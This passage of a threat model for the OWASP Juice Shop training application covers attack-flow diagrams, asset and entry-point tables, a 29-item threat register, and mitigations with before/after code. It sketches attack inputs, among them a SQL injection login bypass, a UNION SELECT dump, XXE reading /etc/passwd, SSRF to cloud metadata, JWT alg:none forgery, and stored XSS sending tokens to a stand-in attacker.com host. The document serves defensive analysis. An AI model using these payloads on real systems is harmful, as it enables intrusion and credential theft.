    AdminRoute-->>Attacker: 200 OK — admin data returned
```

### SQL Injection Flow

This sequence shows how an attacker exploits the raw string interpolation in the product search endpoint to extract the entire Users table via UNION SELECT.

```mermaid
sequenceDiagram
    participant Attacker
    participant SearchRoute as routes/search.ts
    participant Sequelize
    participant SQLite

    Attacker->>SearchRoute: GET /rest/products/search?q=' UNION SELECT * FROM Users
    SearchRoute->>Sequelize: query("SELECT * FROM Products WHERE name LIKE '% ' UNION SELECT * FROM Users %'")
    Sequelize->>SQLite: Execute raw SQL (two statements)
    SQLite-->>Sequelize: Products + all user records incl. password hashes
    Sequelize-->>SearchRoute: Combined result set
    SearchRoute-->>Attacker: 200 OK with user table data in JSON response
```

### Stored XSS Attack Chain (Critical)

This sequence shows how a stored XSS payload in a feedback comment steals the JWT of every subsequent visitor via the bypassed Angular sanitizer.

```mermaid
sequenceDiagram
    participant Attacker
    participant FeedbackEndpoint as POST /api/Feedbacks
    participant SQLite
    participant VictimBrowser as Victim Browser
    participant AboutComponent as about.component.ts
    participant AttackerServer as attacker.com

    Attacker->>FeedbackEndpoint: POST comment with XSS payload
    Note over FeedbackEndpoint: comment: script tag to read localStorage
    FeedbackEndpoint->>SQLite: INSERT feedback with raw HTML
    SQLite-->>FeedbackEndpoint: Stored
    Note over VictimBrowser: Victim browses to /#/about
    VictimBrowser->>AboutComponent: Load feedback list
    AboutComponent->>AboutComponent: bypassSecurityTrustHtml(comment)
    Note over AboutComponent: Angular sanitizer DISABLED — script executes
    AboutComponent->>VictimBrowser: Render unsanitized HTML
    VictimBrowser->>AttackerServer: GET /?token=localStorage.getItem('token')
    AttackerServer-->>Attacker: Victim JWT token — account takeover
```

### File Upload Attack Surface

This sequence shows how a malicious XML upload exploits the XXE-enabled parser (noent:true) to read arbitrary local files from the server.

```mermaid
sequenceDiagram
    participant Attacker
    participant UploadRoute as routes/fileUpload.ts
    participant LibXML as libxmljs2
    participant YAML as js-yaml
    participant FileSystem

    Attacker->>UploadRoute: POST /file-upload (XML with XXE payload)
    UploadRoute->>LibXML: parseXml(data, { noent: true })
    Note over LibXML: noent:true resolves external entities
    LibXML->>FileSystem: Read /etc/passwd (XXE)
    FileSystem-->>LibXML: File contents
    LibXML-->>UploadRoute: Parsed XML with entity expanded
    UploadRoute-->>Attacker: File contents in response

    Attacker->>UploadRoute: POST /file-upload (ZIP with path traversal)
    UploadRoute->>FileSystem: path.resolve('uploads/complaints/' + '../../../server.ts')
    Note over FileSystem: No boundary check — overwrites application files
    FileSystem-->>UploadRoute: Write successful

    Attacker->>UploadRoute: POST /file-upload (YAML bomb)
    UploadRoute->>YAML: yaml.load(yamlBomb)
    Note over YAML: Alias expansion — memory exhaustion
    YAML-->>UploadRoute: Process crash (DoS)
```

### Admin Privilege Escalation (Mass Assignment)

This sequence shows how any authenticated user self-escalates to admin by including the `role` field in a PUT request, which the auto-generated Sequelize API accepts without filtering.

```mermaid
sequenceDiagram
    participant Attacker
    participant SequelizeAPI as PUT /api/Users/:id
    participant UserModel as models/user.ts
    participant SQLite

    Note over Attacker: Attacker has valid user JWT (id=42)
    Attacker->>SequelizeAPI: PUT /api/Users/42 with body: role=admin
    Note over SequelizeAPI: No field filtering on auto-generated CRUD route
    SequelizeAPI->>UserModel: user.update({ role: 'admin', ... })
    UserModel->>SQLite: UPDATE Users SET role='admin' WHERE id=42
    SQLite-->>UserModel: 1 row updated
    UserModel-->>SequelizeAPI: Updated user record
    SequelizeAPI-->>Attacker: 200 OK — role: admin
    Note over Attacker: Now has admin privileges — no token renewal needed
```

---

## 4. Assets

Classification legend: **Restricted** — exposure causes immediate data breach or account compromise. **Confidential** — internal use only; exposure causes privacy violation. **Internal** — operational data; disclosure causes reputational or operational harm. **Public** — intentionally externally accessible.

| Asset | Classification | Description | Linked Threats |
|-------|---------------|-------------|----------------|
| User Credentials (email + MD5 password hash) | Restricted | All registered user accounts in SQLite Users table; MD5 hashing makes hashes immediately crackable | [T-001](#t-001), [T-002](#t-002), [T-006](#t-006) |
| JWT Private Key (RSA) | Restricted | Hardcoded RSA private key in lib/insecurity.ts; publicly visible in GitHub — enables offline JWT forgery | [T-004](#t-004), [T-005](#t-005) |
| User PII (names, addresses, birth dates) | Confidential | Stored in Users table; exposed via SQL injection or IDOR | [T-001](#t-001), [T-002](#t-002), [T-009](#t-009) |
| Payment / Credit Card Data | Restricted | Cards table in SQLite; exposed via SQL injection ([T-002](#t-002)) | [T-001](#t-001), [T-002](#t-002) |
| Order History and Basket Contents | Internal | All purchase history and active baskets; exposed via IDOR | [T-009](#t-009), [T-028](#t-028) |
| Product Inventory and Pricing | Internal | Product catalog including pricing; modifiable via SQL injection | [T-001](#t-001), [T-002](#t-002) |
| Customer Feedback / Reviews | Internal | User-submitted reviews in MarsDB; XSS vector | [T-011](#t-011), [T-014](#t-014), [T-019](#t-019) |
| Application Encryption Keys | Restricted | Exposed unauthenticated at /encryptionkeys/ — RSA and AES keys | [T-003](#t-003) |
| Server-side Log Files | Confidential | Exposed unauthenticated at /support/logs; may contain auth tokens, stack traces | [T-003](#t-003), [T-026](#t-026) |
| Prometheus Metrics | Internal | Unauthenticated /metrics exposes request rates, error counts, endpoint names | [T-003](#t-003) |
| Angular SPA Source Bundle | Public | Compiled JavaScript — all route logic, challenge hints, hidden admin routes visible | — |
| Docker Image and Config | Internal | Contains application binaries, node_modules, and all hardcoded secrets | [T-005](#t-005), [T-007](#t-007) |
| B2B Order Data | Confidential | Business order submissions; RCE vector | [T-010](#t-010) |
| Security Challenge State | Internal | Challenge completion flags per user; IDOR-accessible | [T-009](#t-009) |

---

## 5. Attack Surface

### 5.1 Unauthenticated Entry Points (4)

These entry points accept requests without any authentication token. They represent the highest-risk attack surface for an external unauthenticated attacker.

| ID | Entry Point | Protocol | Notes | Linked Threats |
|----|-------------|----------|-------|----------------|
| E-001 | POST /rest/user/login | HTTP/JSON | SQL injection via raw Sequelize query — authentication bypass and data dump | [T-001](#t-001), [T-006](#t-006) |
| E-002 | GET /rest/products/search?q= | HTTP/JSON | SQL injection via raw Sequelize query — UNION-based full database extraction | [T-002](#t-002), [T-029](#t-029) |
| E-006a | GET /encryptionkeys/ | HTTP | Directory listing of all RSA/AES keys — no authentication required | [T-003](#t-003) |
| E-006b | GET /support/logs, GET /metrics | HTTP | Log files and Prometheus metrics exposed without authentication | [T-003](#t-003), [T-026](#t-026) |

### 5.2 Authenticated Entry Points (4)

These entry points require a valid JWT but are exploitable by any registered user — including users who obtained their JWT via the authentication bypass in E-001.

| ID | Entry Point | Protocol | Auth Required | Notes | Linked Threats |
|----|-------------|----------|---------------|-------|----------------|
| E-003 | POST /b2b/v2/orders | HTTP/JSON | Yes | RCE via notevil vm sandbox escape; authenticated user required | [T-010](#t-010) |
| E-004 | POST /file-upload | HTTP/multipart | Yes | XXE (noent:true), ZIP path traversal, YAML bomb DoS | [T-012](#t-012), [T-013](#t-013), [T-017](#t-017) |
| E-005 | POST /profile/image/url | HTTP/JSON | Yes | SSRF — fetches arbitrary attacker-controlled URLs | [T-016](#t-016) |
| E-007 | PUT /rest/user/whoami (profile update) | HTTP/JSON | Yes | SSTI via eval() on username field; CSP header injection | [T-015](#t-015) |

---

## 6. Trust Boundaries

The application has a flat trust model with no meaningful enforcement between layers. All five trust boundaries have significant weaknesses.

| # | Boundary | From | To | Enforcement Mechanism | Key Weakness | Linked Threats |
|---|----------|------|----|-----------------------|--------------|----------------|
| 1 | Public Internet to Express Backend | Any client on internet | Express server port 3000 | JWT on selected routes; Helmet headers (partial) | No WAF, no rate limiting, no reverse proxy; CORS wildcard; many routes unauthenticated | [T-003](#t-003), [T-018](#t-018), [T-021](#t-021) |
| 2 | Express to SQLite (Sequelize) | Route handlers | SQLite database file | Sequelize ORM (intended) | Raw string interpolation in critical queries bypasses parameterization entirely | [T-001](#t-001), [T-002](#t-002), [T-029](#t-029) |
| 3 | Express to MarsDB | Route handlers | In-memory MarsDB | MarsDB query interface | No type validation on query parameters — object injection enables NoSQL injection | [T-014](#t-014) |
| 4 | Angular SPA to REST API | Browser JavaScript | Express REST endpoints | JWT Bearer token in Authorization header | JWT in localStorage (XSS-extractable); CORS wildcard allows cross-origin credential use | [T-020](#t-020), [T-021](#t-021) |
| 5 | Express to Filesystem | File upload handlers | uploads/, logs/, encryptionkeys/ | path.resolve() (insufficient) | No directory boundary check on ZIP extraction; log and key directories publicly accessible | [T-013](#t-013), [T-003](#t-003), [T-026](#t-026) |

**Boundary 1 notes:** The absence of any network-layer control means that all application-layer vulnerabilities are directly reachable from the internet. A reverse proxy (nginx) with WAF rules would not eliminate the vulnerabilities but would significantly raise the cost of exploitation.

**Boundary 2 notes:** The use of raw string interpolation in Sequelize queries is particularly dangerous because it bypasses the ORM's parameterization entirely while appearing to use a safe ORM pattern. Developers unfamiliar with Sequelize's raw query syntax may miss this during code review.

**Boundary 4 notes:** The CORS wildcard combined with JWT in localStorage creates a compound risk: any website can make API calls on behalf of an authenticated user AND any XSS payload can extract the token for persistent use.

---

## 7. Identified Security Controls

**Gap summary:** The most critical control gaps are: (1) no algorithm enforcement on JWT verification — express-jwt@0.1.3 accepts alg:none tokens (CVE-2020-15084), making authentication trivially bypassable; (2) no server-side admin authorization — all admin enforcement is client-side JavaScript, rendering the admin role meaningless; (3) no rate limiting on any endpoint — brute-force and credential stuffing have zero friction; (4) CORS wildcard policy — any origin can make credentialed API calls, enabling CSRF-equivalent attacks from attacker-controlled sites; (5) Angular DomSanitizer explicitly bypassed in three components — stored XSS is the direct result of intentional sanitizer disablement rather than a missed encoding opportunity.

Legend: ✅ Adequate | ⚠️ Partial | 🔶 Weak | ❌ Missing

| Domain | Control | Implementation | Effectiveness | Linked Threats |
|--------|---------|---------------|---------------|----------------|
| IAM | JWT Authentication (RS256) | [lib/insecurity.ts:57-65](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:57) | 🔶 Weak | [T-004](#t-004), [T-005](#t-005) — algorithm not enforced; key hardcoded in source |
| IAM | Password Hashing | [models/user.ts:77](vscode://file/home/mrohr/juice-shop/models/user.ts:77) — MD5 via lib/insecurity.ts:43 | 🔶 Weak | [T-006](#t-006) — MD5 without salt; instantly crackable via rainbow tables |
| Authorization | Route Auth Middleware (express-jwt) | [lib/insecurity.ts:67-70](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:67) — express-jwt@0.1.3 CVE-2020-15084 | 🔶 Weak | [T-004](#t-004) — vulnerable version; no algorithms restriction |
| Authorization | Admin Role Enforcement | [frontend/src/app/app.guard.ts:42](vscode://file/home/mrohr/juice-shop/frontend/src/app/app.guard.ts:42) — client-side only | ❌ Missing | [T-024](#t-024) — client-side guard trivially bypassed; server APIs unprotected |
| Data Protection | HTTPS/TLS Support | server.ts — HTTP only; TLS terminated upstream in production Docker | ⚠️ Partial | [T-020](#t-020) — JWT in transit unencrypted in dev; depends on deployment config |
| Input Validation | Body Parser / JSON Parsing | server.ts — express.json() | ⚠️ Partial | [T-014](#t-014), [T-015](#t-015) — parses JSON but no schema validation; eval() paths exist |
| Input Validation | Multer File Upload Validation | [routes/fileUpload.ts](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts) — MIME type filter | 🔶 Weak | [T-012](#t-012), [T-013](#t-013) — MIME filter bypassable; no content inspection |
| Audit and Logging | Winston Application Logging | lib/logger.ts — writes to /logs directory | ⚠️ Partial | [T-026](#t-026) — logs exist but /support/logs is publicly accessible |
| Infrastructure | Helmet Security Headers | [server.ts:185-187](vscode://file/home/mrohr/juice-shop/server.ts:185) — noSniff + frameguard only | 🔶 Weak | [T-022](#t-022) — xssFilter disabled; no CSP; insufficient protection |
| Infrastructure | CORS Policy | [server.ts:181-182](vscode://file/home/mrohr/juice-shop/server.ts:181) — cors() wildcard | ❌ Missing | [T-021](#t-021) — allows all origins; no restriction |
| Infrastructure | Rate Limiting | Not implemented anywhere | ❌ Missing | [T-018](#t-018) — no brute-force protection on any endpoint |
| Dependency | Dependabot / npm audit | .github/workflows — Dependabot configured; alerts enabled | ⚠️ Partial | [T-004](#t-004) — express-jwt@0.1.3 remains despite known CVE-2020-15084 |
| Security Testing | CodeQL SAST | [.github/workflows/codeql-analysis.yml:19](vscode://file/home/mrohr/juice-shop/.github/workflows/codeql-analysis.yml:19) — mutable tag v3 | ⚠️ Partial | Supply chain risk from mutable GitHub Action tag |
| Security Testing | OWASP ZAP DAST | .github/workflows/zap.yml — active scan on PR | ⚠️ Partial | DAST present but intentional vulnerabilities pass; limited signal |

---

## 8. Threat Register

**Risk Distribution:** Critical: 7 · High: 12 · Medium: 6 · Low: 4 · **Total: 29**
**STRIDE Coverage:** Spoofing: 4 · Tampering: 7 · Repudiation: 1 · Information Disclosure: 9 · Denial of Service: 3 · Elevation of Privilege: 5

<!-- QA: T-028 is placed in section 8.4 Low but has Risk=Critical and Likelihood=High/Impact=Critical. It should be in section 8.1 Critical. The threat analyst placed it intentionally in this position — review whether to move it to 8.1 or add an explicit escalation note. -->

### 8.1 Critical (7)

These seven threats represent immediate, high-confidence exploitation paths requiring minimal attacker skill. All are confirmed by direct source code evidence.

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-001"></a>T-001 | REST API | Tampering | SQL injection in POST /rest/user/login via raw string interpolation at [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34). Attacker submits `email=' OR 1=1--` to bypass authentication and dump all Users records including MD5 password hashes. CWE-89. | High | Critical | 🔴 Critical | None — raw Sequelize query | [M-001](#m-001) |
| <a id="t-002"></a>T-002 | REST API | Information Disclosure | SQL injection in GET /rest/products/search via [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23). UNION-based extraction of entire SQLite database including Users, Cards, and BasketItems tables. CWE-89. | High | Critical | 🔴 Critical | None — raw Sequelize query | [M-001](#m-001) |
| <a id="t-004"></a>T-004 | Auth Service | Spoofing | JWT alg:none bypass via CVE-2020-15084 in express-jwt@0.1.3 at [lib/insecurity.ts:67](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:67). Attacker forges admin JWT by setting alg to none and removing signature. CWE-347. | High | Critical | 🔴 Critical | RS256 key pair present but algorithm not enforced | [M-003](#m-003) |
| <a id="t-005"></a>T-005 | Auth Service | Spoofing | Hardcoded RSA private key at [lib/insecurity.ts:28](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:28) — publicly visible in GitHub repository. Any actor can sign arbitrary RS256 JWTs for any user identity or role offline. CWE-321. | High | Critical | 🔴 Critical | Public key verification performed; private key in source | [M-004](#m-004) |
| <a id="t-006"></a>T-006 | Auth Service | Information Disclosure | MD5 password hashing at [models/user.ts:77](vscode://file/home/mrohr/juice-shop/models/user.ts:77). When database is dumped via T-001/T-002, all passwords crackable in seconds via GPU rainbow tables. No salt. CWE-916. | High | Critical | 🔴 Critical | Passwords stored as hashes (MD5, no salt) | [M-005](#m-005) |
| <a id="t-010"></a>T-010 | B2B Orders | Elevation of Privilege | Remote Code Execution via notevil/vm sandbox escape at [routes/b2bOrder.ts:23](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts:23). User-controlled orderLinesData evaluated via vm.runInContext. Known notevil escapes allow arbitrary Node.js execution. CWE-94. | Medium | Critical | 🔴 Critical | vm.runInContext with 2s timeout — insufficient sandbox | [M-009](#m-009) |
| <a id="t-019"></a>T-019 | Frontend SPA | Tampering | Stored XSS via explicit DomSanitizer bypass at [frontend/src/app/about/about.component.ts:119](vscode://file/home/mrohr/juice-shop/frontend/src/app/about/about.component.ts:119). Attacker posts feedback with `<script>` payload to exfiltrate all visitor JWTs from localStorage. CWE-79. | High | Critical | 🔴 Critical | Angular DomSanitizer present but explicitly bypassed | [M-017](#m-017) |

### 8.2 High (12)

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-003"></a>T-003 | REST API | Information Disclosure | Unauthenticated access to /encryptionkeys/, /support/logs, /metrics at [server.ts:277-281,718](vscode://file/home/mrohr/juice-shop/server.ts:277). No auth middleware on these routes. Exposes RSA keys, server logs (with tokens), Prometheus metrics. CWE-200. | High | High | 🟠 High | None — no auth middleware | [M-002](#m-002) |
| <a id="t-007"></a>T-007 | Auth Service | Spoofing | Hardcoded test credentials at [routes/login.ts:69-75](vscode://file/home/mrohr/juice-shop/routes/login.ts:69) including support@juice-sh.op plaintext password. HMAC key hardcoded at [lib/insecurity.ts:44](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:44). CWE-798. | High | High | 🟠 High | None — credentials in public repo | [M-006](#m-006) |
| <a id="t-009"></a>T-009 | REST API | Elevation of Privilege | IDOR on /api/Baskets/:id and /api/DataExport — no ownership verification. [routes/dataExport.ts:26](vscode://file/home/mrohr/juice-shop/routes/dataExport.ts:26) uses req.body.UserId allowing extraction of any user's order history. CWE-639. | High | High | 🟠 High | JWT auth required; no ownership check | [M-008](#m-008) |
| <a id="t-011"></a>T-011 | REST API | Spoofing | Review author forgery at [routes/createProductReviews.ts:22](vscode://file/home/mrohr/juice-shop/routes/createProductReviews.ts:22) — uses req.body.author instead of session email. Post reviews as admin@juice-sh.op. CWE-290. | High | Medium | 🟠 High | Auth required; author field unbound | [M-010](#m-010) |
| <a id="t-012"></a>T-012 | File Upload | Information Disclosure | XXE via libxmljs2 with noent:true at [routes/fileUpload.ts:83](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:83). Upload XML with external entity to read /etc/passwd or internal service URLs. CWE-611. | Medium | High | 🟠 High | XML parsing present; noent enables XXE | [M-011](#m-011) |
| <a id="t-013"></a>T-013 | File Upload | Tampering | ZIP path traversal at [routes/fileUpload.ts:42](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:42). path.resolve() without directory boundary check allows overwriting arbitrary application files. CWE-22. | Medium | High | 🟠 High | path.resolve() present; no boundary check | [M-012](#m-012) |
| <a id="t-014"></a>T-014 | REST API | Tampering | NoSQL injection in product reviews at [routes/updateProductReviews.ts:18](vscode://file/home/mrohr/juice-shop/routes/updateProductReviews.ts:18). Object-type req.body.id passed directly to MarsDB — enables bulk update or $where JS injection. CWE-943. | Medium | High | 🟠 High | None — no type validation | [M-013](#m-013) |
| <a id="t-015"></a>T-015 | REST API | Tampering | SSTI via eval() at [routes/userProfile.ts:62](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:62) — eval(code) on user-controlled username. CSP header injection at line 88 injects profileImage into Content-Security-Policy. CWE-94, CWE-74. | Medium | Critical | 🔴 Critical | None — direct eval of user input | [M-009](#m-009) |
| <a id="t-016"></a>T-016 | REST API | Information Disclosure | SSRF at [routes/profileImageUrlUpload.ts:24](vscode://file/home/mrohr/juice-shop/routes/profileImageUrlUpload.ts:24). Raw fetch(url) with no URL validation — read local files via file:// or AWS metadata via http://169.254.169.254/. CWE-918. | Medium | High | 🟠 High | None — no URL validation | [M-014](#m-014) |
| <a id="t-020"></a>T-020 | Frontend SPA | Information Disclosure | JWT stored in localStorage at [frontend/src/app/Services/request.interceptor.ts:13](vscode://file/home/mrohr/juice-shop/frontend/src/app/Services/request.interceptor.ts:13). Any XSS payload can extract and exfiltrate the token. CWE-922. | High | High | 🟠 High | None — token in localStorage | [M-018](#m-018) |
| <a id="t-021"></a>T-021 | Frontend SPA | Spoofing | CORS wildcard at [server.ts:181-182](vscode://file/home/mrohr/juice-shop/server.ts:181) — any origin can make credentialed API calls. Enables CSRF-style attacks from attacker-controlled sites. CWE-942. | Medium | High | 🟠 High | None — cors() with no restrictions | [M-019](#m-019) |
| <a id="t-023"></a>T-023 | Admin Panel | Tampering | Stored XSS in admin panel at [frontend/src/app/administration/administration.component.ts:60,78](vscode://file/home/mrohr/juice-shop/frontend/src/app/administration/administration.component.ts:60). bypassSecurityTrustHtml on user email and feedback — admin triggers attacker JavaScript. CWE-79. | High | High | 🟠 High | Angular DomSanitizer bypassed | [M-017](#m-017) |
| <a id="t-024"></a>T-024 | Admin Panel | Elevation of Privilege | Admin UI protected only by client-side guard at [frontend/src/app/app.guard.ts:42](vscode://file/home/mrohr/juice-shop/frontend/src/app/app.guard.ts:42). Server-side admin endpoints have no role enforcement. Any JWT holder can call admin routes directly. CWE-602. | High | High | 🟠 High | Client-side guard only | [M-021](#m-021) |

### 8.3 Medium (6)

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-008"></a>T-008 | Auth Service | Elevation of Privilege | Open redirect at [lib/insecurity.ts:137](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:137) — url.includes() substring check allows redirects to domains containing the trusted hostname as substring. Enables post-auth phishing. CWE-601. | Medium | Medium | 🟡 Medium | Allowlist check present; substring match | [M-007](#m-007) |
| <a id="t-017"></a>T-017 | REST API | Denial of Service | YAML bomb DoS at [routes/fileUpload.ts:117](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:117) — yaml.load() without safe schema or expansion limits. Billion-laughs-equivalent YAML crashes Node.js process. CWE-776. | Low | High | 🟡 Medium | vm sandbox present; YAML parsed before it | [M-015](#m-015) |
| <a id="t-018"></a>T-018 | REST API | Denial of Service | No rate limiting on /rest/user/login or /rest/user/register. Unlimited brute-force and credential stuffing with zero friction. CWE-307. | Medium | Medium | 🟡 Medium | None | [M-016](#m-016) |
| <a id="t-022"></a>T-022 | Frontend SPA | Information Disclosure | Weak CSP at [server.ts:185-187](vscode://file/home/mrohr/juice-shop/server.ts:185) — only noSniff and frameguard via Helmet; xssFilter disabled. Dynamic CSP in userProfile.ts injects user-controlled image URL. CWE-693. | Medium | Medium | 🟡 Medium | Partial Helmet headers | [M-020](#m-020) |
| <a id="t-026"></a>T-026 | Data Services | Repudiation | No structured audit log for data modifications. Winston logs to filesystem but /support/logs is publicly accessible (T-003). Attacker can deny actions without forensic trail. CWE-778. | Medium | Medium | 🟡 Medium | Winston logging (filesystem, unauthenticated) | [M-002](#m-002) |
| <a id="t-027"></a>T-027 | Data Services | Information Disclosure | SQLite database at data/juiceshop.sqlite stored without encryption at rest. Container filesystem access (via T-013 path traversal or container escape) yields immediate plaintext data. CWE-311. | Low | High | 🟡 Medium | None — SQLite file unencrypted | [M-005](#m-005) |

### 8.4 Low (4)

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-025"></a>T-025 | File Upload | Denial of Service | Malformed XML or oversized uploads can exhaust Node.js event loop. libxmljs2 parses synchronously. No pre-parse size limit enforced. CWE-400. | Low | Medium | 🟢 Low | Multer limit present; applied after buffering | [M-015](#m-015) |
| <a id="t-028"></a>T-028 | Data Services | Tampering | Mass assignment on Sequelize auto-API at /api/Users/:id PUT — accepts all model attributes including role. Any user can PUT `{role:'admin'}` to their own record. CWE-915. | High | Critical | 🔴 Critical | None on model-level auto-API | [M-008](#m-008) |
| <a id="t-029"></a>T-029 | Data Services | Information Disclosure | Verbose SQL error messages returned to client. Raw Sequelize/SQLite stack traces including table names and query fragments aid SQL injection reconnaissance. CWE-209. | Medium | Low | 🟢 Low | Generic Express error handler (partial) | [M-001](#m-001) |
| <a id="t-015b"></a>T-015b | REST API | Tampering | CSP header injection at [routes/userProfile.ts:88](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:88) — user's profileImage URL injected into Content-Security-Policy header value without sanitization. Enables CSP bypass for self-XSS. CWE-74. | Low | Medium | 🟢 Low | None | [M-020](#m-020) |

---

## 9. Critical Findings

There are 7 Critical findings. The attack chain below shows how two of them chain to a complete account takeover with no user interaction.

```mermaid
graph TD
    A["Attacker"]
    B["POST /api/Feedbacks\nStore XSS payload in comment"]
    C["T-019: Stored XSS\nabout.component.ts:119\nbypassSecurityTrustHtml"]
    D["Victim visits /#/about\nScript executes"]
    E["T-020: JWT in localStorage\nrequest.interceptor.ts:13\nlocalStorage.getItem('token')"]
    F["Exfiltrate JWT to attacker.com"]
    G["Attacker uses victim JWT\nAuthenticated as victim"]

    A -->|"POST /api/Feedbacks\nscript payload"| B
    B --> C
    C -->|"Angular renders unsanitized HTML"| D
    D -->|"Script reads"| E
    E -->|"HTTP GET attacker.com/?c=token"| F
    F --> G
```

**Key takeaway:** The stored XSS and localStorage JWT storage together form a zero-interaction session hijacking chain. The attacker posts a single feedback and waits for any authenticated user (including admins) to visit the about page.

| ID | Component | STRIDE | Summary | Risk | Mitigation |
|----|-----------|--------|---------|------|-----------|
| [T-001](#t-001) | REST API | Tampering | SQL injection at /rest/user/login — authentication bypass and full database dump | 🔴 Critical | [M-001](#m-001) |
| [T-002](#t-002) | REST API | Information Disclosure | SQL injection at /rest/products/search — UNION dump of all tables | 🔴 Critical | [M-001](#m-001) |
| [T-004](#t-004) | Auth Service | Spoofing | JWT alg:none bypass (CVE-2020-15084) — forge admin token | 🔴 Critical | [M-003](#m-003) |
| [T-005](#t-005) | Auth Service | Spoofing | Hardcoded RSA private key — offline admin JWT forgery | 🔴 Critical | [M-004](#m-004) |
| [T-006](#t-006) | Auth Service | Information Disclosure | MD5 passwords — instant rainbow-table cracking | 🔴 Critical | [M-005](#m-005) |
| [T-010](#t-010) | B2B Orders | Elevation of Privilege | RCE via notevil vm sandbox escape | 🔴 Critical | [M-009](#m-009) |
| [T-019](#t-019) | Frontend SPA | Tampering | Stored XSS + JWT in localStorage — session hijack chain | 🔴 Critical | [M-017](#m-017) |

---

## 10. Mitigation Register

### P1 — Immediate

---

#### M-001 — Replace raw SQL string interpolation with parameterized queries {#m-001}

**Addresses:** [T-001](#t-001), [T-002](#t-002), [T-029](#t-029)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Low

**Why:** Two confirmed SQL injection paths — authentication bypass and full database dump — result from raw string interpolation in Sequelize queries. This is the highest-severity finding by ease of exploitation and data impact.

**How:**
1. Replace the raw query at [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34) with a parameterized replacements array
2. Replace the raw query at [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23) with parameterized replacements
3. Audit all `sequelize.query()` calls: `grep -r 'sequelize.query.*\${' routes/`
4. Enable a generic error handler to suppress Sequelize stack traces in HTTP 500 responses

```javascript
// BEFORE (vulnerable — routes/login.ts:34):
models.sequelize.query(
  `SELECT * FROM Users WHERE email = '${req.body.email}' AND password = '${security.hash(req.body.password)}'`
)

// AFTER (safe — parameterized):
models.sequelize.query(
  'SELECT * FROM Users WHERE email = ? AND password = ? AND deletedAt IS NULL',
  {
    replacements: [req.body.email, security.hash(req.body.password || '')],
    type: QueryTypes.SELECT
  }
)
```

**Verification:** Run sqlmap against POST /rest/user/login and GET /rest/products/search. Both should report no injectable parameters. Confirm HTTP 500 responses no longer include SQL query fragments.

**Reference:** CWE-89, https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

---

#### M-002 — Restrict unauthenticated access to /encryptionkeys, /support/logs, /metrics {#m-002}

**Addresses:** [T-003](#t-003), [T-026](#t-026)
**Priority:** **P1 — Immediate**
**Severity:** 🟠 High
**Effort:** Low

**Why:** RSA encryption keys and server log files are publicly accessible without any authentication, providing attackers with immediate access to cryptographic material and server-side intelligence.

**How:**
1. Add `security.isAuthorized()` + `security.isAdmin()` middleware to the /encryptionkeys and /support/logs routes in [server.ts:277-281](vscode://file/home/mrohr/juice-shop/server.ts:277)
2. Add an IP allowlist middleware for /metrics limiting access to localhost
3. Consider removing /encryptionkeys entirely outside development mode

```javascript
// BEFORE (server.ts ~277-281, 718):
app.use('/encryptionkeys', serveIndex('encryptionkeys', ...))
app.use('/support/logs', serveIndex('logs', ...))
app.get('/metrics', metrics.serveMetrics())

// AFTER:
app.use('/encryptionkeys', security.isAuthorized(), security.isAdmin(), serveIndex('encryptionkeys', ...))
app.use('/support/logs', security.isAuthorized(), security.isAdmin(), serveIndex('logs', ...))
app.get('/metrics', ipAllowlist(['127.0.0.1', '::1']), metrics.serveMetrics())
```

**Verification:** `curl -s http://localhost:3000/encryptionkeys` should return 401 without a valid admin JWT. `curl -s http://localhost:3000/metrics` from a non-localhost IP should return 403.

**Reference:** CWE-200, OWASP API Security Top 10 API3:2023

---

#### M-003 — Upgrade express-jwt and enforce RS256 algorithm explicitly {#m-003}

**Addresses:** [T-004](#t-004)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Low

**Why:** express-jwt@0.1.3 is affected by CVE-2020-15084 which allows alg:none tokens to be accepted. Without explicit algorithm enforcement, any attacker can forge a valid admin JWT by removing the signature.

**How:**
1. Upgrade express-jwt: `npm install express-jwt@^8`
2. Upgrade jsonwebtoken: `npm install jsonwebtoken@^9`
3. Add `algorithms: ['RS256']` to the isAuthorized() options in [lib/insecurity.ts:67](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:67)
4. Add an integration test sending a JWT with alg:none — must return 401

```javascript
// BEFORE (lib/insecurity.ts):
export const isAuthorized = () => expressJwt({ secret: publicKey } as any)

// AFTER (express-jwt@8.x):
import { expressjwt } from 'express-jwt'
export const isAuthorized = () => expressjwt({
  secret: publicKey,
  algorithms: ['RS256'],
  requestProperty: 'user'
})
```

**Verification:** POST a JWT with `{"alg":"none"}` header to an authenticated endpoint — must return 401. Verify legitimate RS256 tokens still work.

**Reference:** CVE-2020-15084, CVE-2022-23529, CWE-347

---

#### M-004 — Remove hardcoded RSA private key — load from environment or secret manager {#m-004}

**Addresses:** [T-005](#t-005)
